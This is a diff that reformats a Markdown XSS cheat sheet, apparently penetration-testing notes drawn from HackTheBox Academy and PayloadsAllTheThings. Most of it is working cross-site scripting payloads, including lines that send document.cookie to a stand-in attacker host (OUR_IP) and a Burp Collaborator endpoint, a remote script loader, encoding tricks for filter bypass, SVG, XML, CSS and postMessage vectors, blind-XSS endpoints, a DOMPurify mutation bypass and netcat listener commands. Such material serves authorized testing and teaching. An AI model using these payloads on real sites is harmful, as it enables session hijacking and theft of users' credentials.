@@ -1,26 +1,26 @@
 ﻿### XSS Payloads
 
-| Code                                                                                          | Description                                   |
+| Code | Description |
 | --------------------------------------------------------------------------------------------- | --------------------------------------------- |
-| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                             |
-| `<plaintext>`                                                                                 | Basic XSS Payload (renders page as plaintext) |
-| `<script>print()</script>`                                                                    | Basic XSS Payload (triggers print dialog)     |
-| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload                        |
-| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color                       |
-| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image                       |
-| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title                          |
-| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite Website's Main Body                 |
-| `<script>document.getElementById('urlform').remove();</script>`                               | Remove Certain HTML Element                   |
-| `<script src="http://OUR_IP/script.js"></script>`                                             | Load Remote Script                            |
-| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie Details to Attacker               |
+| `<script>alert(window.origin)</script>` | Basic XSS Payload |
+| `<plaintext>` | Basic XSS Payload (renders page as plaintext) |
+| `<script>print()</script>` | Basic XSS Payload (triggers print dialog) |
+| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
+| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
+| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite Website's Main Body |
+| `<script>document.getElementById('urlform').remove();</script>` | Remove Certain HTML Element |
+| `<script src="http://OUR_IP/script.js"></script>` | Load Remote Script |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie Details to Attacker |
 
 ### Commands
 
-| Code                                                                | Description                     |
+| Code | Description |
 | ------------------------------------------------------------------- | ------------------------------- |
 | `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run XSStrike on a URL parameter |
-| `sudo nc -lvnp 80`                                                  | Start Netcat Listener           |
-| `sudo php -S 0.0.0.0:80`                                            | Start PHP Server                |
+| `sudo nc -lvnp 80` | Start Netcat Listener |
+| `sudo php -S 0.0.0.0:80` | Start PHP Server |
 
 
 ## Summary
@@ -29,36 +29,36 @@
 
 - [Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#methodology)
 - [Proof of Concept](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#proof-of-concept)
-    - [Data Grabber](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#data-grabber)
-    - [CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#cors)
-    - [UI Redressing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#ui-redressing)
-    - [Javascript Keylogger](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#javascript-keylogger)
-    - [Other Ways](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-ways)
+ - [Data Grabber](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#data-grabber)
+ - [CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#cors)
+ - [UI Redressing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#ui-redressing)
+ - [Javascript Keylogger](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#javascript-keylogger)
+ - [Other Ways](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-ways)
 - [Identify an XSS Endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#identify-an-xss-endpoint)
-    - [Tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#tools)
+ - [Tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#tools)
 - [XSS in HTML/Applications](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-htmlapplications)
-    - [Common Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#common-payloads)
-    - [XSS using HTML5 tags](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-using-html5-tags)
-    - [XSS using a Remote JS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-using-a-remote-js)
-    - [XSS in Hidden Input](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-hidden-input)
-    - [XSS in Uppercase Output](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-uppercase-output)
-    - [DOM Based XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#dom-based-xss)
-    - [XSS in JS Context](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-js-context)
+ - [Common Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#common-payloads)
+ - [XSS using HTML5 tags](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-using-html5-tags)
+ - [XSS using a Remote JS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-using-a-remote-js)
+ - [XSS in Hidden Input](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-hidden-input)
+ - [XSS in Uppercase Output](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-uppercase-output)
+ - [DOM Based XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#dom-based-xss)
+ - [XSS in JS Context](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-js-context)
 - [XSS in Wrappers for URI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-wrappers-for-uri)
-    - [Wrapper javascript:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-javascript)
-    - [Wrapper data:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-data)
-    - [Wrapper vbscript:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-vbscript)
+ - [Wrapper javascript:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-javascript)
+ - [Wrapper data:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-data)
+ - [Wrapper vbscript:](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#wrapper-vbscript)
 - [XSS in Files](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-files)
-    - [XSS in XML](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-xml)
-    - [XSS in SVG](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-svg)
-    - [XSS in Markdown](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-markdown)
-    - [XSS in CSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-css)
+ - [XSS in XML](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-xml)
+ - [XSS in SVG](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-svg)
+ - [XSS in Markdown](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-markdown)
+ - [XSS in CSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-css)
 - [XSS in PostMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-postmessage)
 - [Blind XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#blind-xss)
-    - [XSS Hunter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-hunter)
-    - [Other Blind XSS tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-blind-xss-tools)
-    - [Blind XSS endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#blind-xss-endpoint)
-    - [Tips](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#tips)
+ - [XSS Hunter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-hunter)
+ - [Other Blind XSS tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-blind-xss-tools)
+ - [Blind XSS endpoint](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#blind-xss-endpoint)
+ - [Tips](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#tips)
 - [Mutated XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#mutated-xss)
 - [Labs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#labs)
 - [References](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#references)
@@ -72,11 +72,11 @@ Cross-Site Scripting (XSS) is a type of computer security vulnerability typicall
 There are 3 main types of XSS attacks:
 
 - **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.
-    
+ 
 - **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.
-    
+ 
 - **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.
-    
+ 
 
 To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.
 
@@ -116,11 +116,11 @@ fclose($fp);
 
 ```html
 <script>
-  fetch('https://<SESSION>.burpcollaborator.net', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
+ fetch('https://<SESSION>.burpcollaborator.net', {
+ method: 'POST',
+ mode: 'no-cors',
+ body: document.cookie
+ });
 </script>
 ```
 
@@ -151,7 +151,7 @@ Another way to collect sensitive data is to set a javascript keylogger.
 
 [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-ways)
 
-More exploits atÂ [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
+More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
 
 - [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
 - [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
@@ -170,19 +170,19 @@ This payload opens the debugger in the developer console rather than triggering 
 <script>debugger;</script>
 ```
 
-Modern applications with content hosting can useÂ [sandbox domains](https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html)
+Modern applications with content hosting can use [sandbox domains](https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html)
 
 > to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.
 
-For this reason, it's better to useÂ `alert(document.domain)`Â orÂ `alert(window.origin)`Â rather thanÂ `alert(1)`Â as default XSS payload in order to know in which scope the XSS is actually executing.
+For this reason, it's better to use`alert(document.domain)` or`alert(window.origin)` rather than`alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
 
-Better payload replacingÂ `<script>alert(1)</script>`:
+Better payload replacing`<script>alert(1)</script>`:
 
 ```html
 <script>alert(document.domain.concat("\n").concat(window.origin))</script>
 ```
 
-WhileÂ `alert()`Â is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, soÂ `console.log()`Â can be used instead to display a message in the console of the developer console (doesn't require any interaction).
+While`alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so`console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).
 
 Example:
 
@@ -278,8 +278,8 @@ Most tools are also suitable for blind XSS attacks:
 <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
 
 <body ontouchstart=alert(1)> // Triggers when a finger touch the screen
-<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
-<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
+<body ontouchend=alert(1)> // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)> // When a finger is dragged across the screen.
 ```
 
 ### XSS using a remote JS
@@ -305,7 +305,7 @@ Use CTRL+SHIFT+X to trigger the onclick event
 in newer browsers : firefox-130/chrome-108
 
 ```js
-<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
+<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto" >
 ```
 
 ### XSS in Uppercase Output
@@ -357,9 +357,9 @@ We can encode the "javascript:" in Hex/Octal
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
 
 We can use a 'newline character'
-java%0ascript:alert(1)   - LF (\n)
-java%09script:alert(1)   - Horizontal tab (\t)
-java%0dscript:alert(1)   - CR (\r)
+java%0ascript:alert(1) - LF (\n)
+java%09script:alert(1) - Horizontal tab (\t)
+java%0dscript:alert(1) - CR (\r)
 
 Using the escape character
 \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
@@ -393,11 +393,11 @@ vbscript:msgbox("XSS")
 
 [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-files)
 
-**NOTE:**Â The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+**NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
 
 ```xml
 <name>
-  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+ <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
 </name>
 ```
 
@@ -425,10 +425,10 @@ Simple script. Codename: green triangle
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-  <script type="text/javascript">
-    alert(document.domain);
-  </script>
+ <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+ <script type="text/javascript">
+ alert(document.domain);
+ </script>
 </svg>
 ```
 
@@ -439,17 +439,17 @@ More comprehensive payload with svg tag attribute, desc script, foreignObject sc
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 <svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
-  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
-  <desc><script>alert('svg desc')</script></desc>
-  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
-  <foreignObject width="500" height="500">
-    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
-  </foreignObject>
-  <title><script>alert('svg title')</script></title>
-  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
-  <script type="text/javascript">
-    alert('svg script');
-  </script>
+ <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
+ <desc><script>alert('svg desc')</script></desc>
+ <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
+ <foreignObject width="500" height="500">
+ <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
+ </foreignObject>
+ <title><script>alert('svg title')</script></title>
+ <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
+ <script type="text/javascript">
+ alert('svg script');
+ </script>
 </svg>
 ```
 
@@ -475,17 +475,17 @@ SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
+ <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
 </svg>
 ```
 
-Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since theÂ `style`Â attribute is no longer a vector on modern browsers. Author: noraj.
+Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the`style` attribute is no longer a vector on modern browsers. Author: noraj.
 
 SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
+ <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
 </svg>
 ```
 
@@ -493,14 +493,14 @@ However, including svg tags in SVG documents works and allows XSS execution from
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <svg x="10">
-    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
-    <script type="text/javascript">alert('sub-svg 1');</script>
-  </svg>
-  <svg x="200">
-    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
-    <script type="text/javascript">alert('sub-svg 2');</script>
-  </svg>
+ <svg x="10">
+ <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
+ <script type="text/javascript">alert('sub-svg 1');</script>
+ </svg>
+ <svg x="200">
+ <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
+ <script type="text/javascript">alert('sub-svg 2');</script>
+ </svg>
 </svg>
 ```
 
@@ -524,15 +524,15 @@ However, including svg tags in SVG documents works and allows XSS execution from
 <html>
 <head>
 <style>
-div  {
-    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
-    background-color: #cccccc;
+div {
+ background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+ background-color: #cccccc;
 }
 </style>
 </head>
-  <body>
-    <div>lol</div>
-  </body>
+ <body>
+ <div>lol</div>
+ </body>
 </html>
 ```
 
@@ -545,21 +545,21 @@ div  {
 ```html
 <html>
 <body>
-    <input type=button value="Click Me" id="btn">
+ <input type=button value="Click Me" id="btn">
 </body>
 
 <script>
 document.getElementById('btn').onclick = function(e){
-    window.poc = window.open('http://www.redacted.com/#login');
-    setTimeout(function(){
-        window.poc.postMessage(
-            {
-                "sender": "accounts",
-                "url": "javascript:confirm('XSS')",
-            },
-            '*'
-        );
-    }, 2000);
+ window.poc = window.open('http://www.redacted.com/#login');
+ setTimeout(function(){
+ window.poc.postMessage(
+ {
+ "sender": "accounts",
+ "url": "javascript:confirm('XSS')",
+ },
+ '*'
+ );
+ }, 2000);
 }
 </script>
 </html>
@@ -575,12 +575,12 @@ document.getElementById('btn').onclick = function(e){
 
 > XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
 
-XSS Hunter is deprecated, it was available atÂ [https://xsshunter.com/app](https://xsshunter.com/app).
+XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app).
 
 You can set up an alternative version
 
-- Self-hosted version fromÂ [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
-- Hosted onÂ [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
+- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
+- Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
 
 ```xml
 "><script src="https://js.rip/<custom.name>"></script>
@@ -592,9 +592,9 @@ You can set up an alternative version
 
 [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#other-blind-xss-tools)
 
-- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy)Â - Sleepy Puppy XSS Payload Management Framework
-- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS)Â - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.
-- [ssl/ezXSS](https://github.com/ssl/ezXSS)Â - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.
+- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
+- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.
+- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.
 
 ### Blind XSS endpoint
 
@@ -603,19 +603,19 @@ You can set up an alternative version
 - Contact forms
 - Ticket support
 - Referer Header
-    - Custom Site Analytics
-    - Administrative Panel logs
+ - Custom Site Analytics
+ - Administrative Panel logs
 - User Agent
-    - Custom Site Analytics
-    - Administrative Panel logs
+ - Custom Site Analytics
+ - Administrative Panel logs
 - Comment Box
-    - Administrative Panel
+ - Administrative Panel
 
 ### Tips
 
 [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#tips)
 
-You can use aÂ [Data grabber for XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#data-grabber-for-xss)Â and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+You can use a [Data grabber for XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
 
 Eg. payload
 
@@ -635,7 +635,7 @@ $ ruby -run -ehttpd . -p8080
 
 Use browsers quirks to recreate some HTML tags.
 
-**Example**: Mutated XSS from Masato Kinugawa, used againstÂ [cure53/DOMPurify](https://github.com/cure53/DOMPurify)Â component on Google Search.
+**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search.
 
 ```js
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
